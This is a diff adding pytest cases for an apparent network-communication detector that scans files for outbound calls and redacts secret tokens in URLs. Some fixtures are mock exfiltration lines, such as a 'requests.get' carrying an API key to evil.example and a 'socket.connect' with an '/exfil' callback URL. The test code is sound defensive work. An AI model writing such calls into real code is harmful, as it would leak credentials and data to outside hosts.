@@ -2,6 +2,7 @@
 
 import json
 import os
+from collections.abc import Iterator
 from pathlib import Path
 from urllib.parse import urlparse
 
@@ -250,6 +251,23 @@ class TestNetworkCommDetector:
 
         assert url_finding["url"] == "https://example.com/download;token=<redacted>/model.bin"
         assert path_token not in json.dumps(url_finding, sort_keys=True)
+
+    def test_path_parameter_key_value_parts_are_redacted(self) -> None:
+        """Matrix-style sensitive keys can carry their value in the next part."""
+        detector = NetworkCommDetector()
+        path_token = "SECRET123"
+
+        findings = detector.scan(
+            f"requests.get('https://evil.example/path;api_key;{path_token}/model.bin')".encode(),
+            "metadata.py",
+        )
+        serialized = json.dumps(findings, sort_keys=True)
+        url_finding = next(finding for finding in findings if finding["type"] == "url_detected")
+        network_finding = next(finding for finding in findings if finding["type"] == "network_function")
+
+        assert url_finding["url"] == "https://evil.example/path;api_key;<redacted>/model.bin"
+        assert network_finding["snippet"] == "requests.get https://evil.example/path;api_key;<redacted>/model.bin"
+        assert path_token not in serialized
 
     def test_encoded_path_parameter_tokens_are_redacted(self) -> None:
         """Encoded matrix delimiters should still expose path parameter tokens."""
@@ -1170,6 +1188,7 @@ class TestNetworkCommDetector:
             ".format('SECRETTAIL')",
             "% 'SECRETTAIL'",
             "&&ADJACENTSECRET123",
+            "@SECRETTAIL",
             "-ADJACENTSECRET123",
             "/ADJACENTSECRET123",
         ],
@@ -1927,3 +1946,36 @@ def test_network_finding_limit_preserves_high_signal_before_noisy_urls() -> None
     assert findings[-1]["max_findings"] == 2
     assert findings[-1]["analysis_incomplete"] is True
     assert findings[-1]["truncated_finding"]["type"] == "url_detected"
+
+
+def test_network_finding_limit_does_not_eagerly_index_urls(monkeypatch: pytest.MonkeyPatch) -> None:
+    detector = NetworkCommDetector({"max_findings": 1})
+
+    def fail_if_indexed(_data: bytes) -> list[tuple[int, int, str]]:
+        raise AssertionError("URL contexts were eagerly indexed")
+
+    monkeypatch.setattr(detector, "_index_url_contexts", fail_if_indexed)
+    data = b"socket.connect callback_url=https://evil.example/exfil " + (
+        b"https://docs.example.com/reference " * 10_000
+    )
+
+    findings = detector.scan(data, "tokens.txt")
+
+    assert findings[0]["type"] in {"cc_pattern", "network_function"}
+    assert findings[-1]["type"] == "detector_finding_limit"
+
+
+def test_network_finding_limit_stops_lazy_url_index_after_budget(monkeypatch: pytest.MonkeyPatch) -> None:
+    detector = NetworkCommDetector({"max_findings": 1})
+
+    def bounded_contexts(_data: bytes) -> Iterator[tuple[int, int, str]]:
+        yield 0, 25, "https://one.example/path"
+        yield 26, 51, "https://two.example/path"
+        raise AssertionError("URL indexing continued beyond the finding budget")
+
+    monkeypatch.setattr(detector, "_iter_url_contexts", bounded_contexts)
+
+    findings = detector.scan(b"", "tokens.txt")
+
+    assert findings[0]["type"] == "url_detected"
+    assert findings[-1]["type"] == "detector_finding_limit"
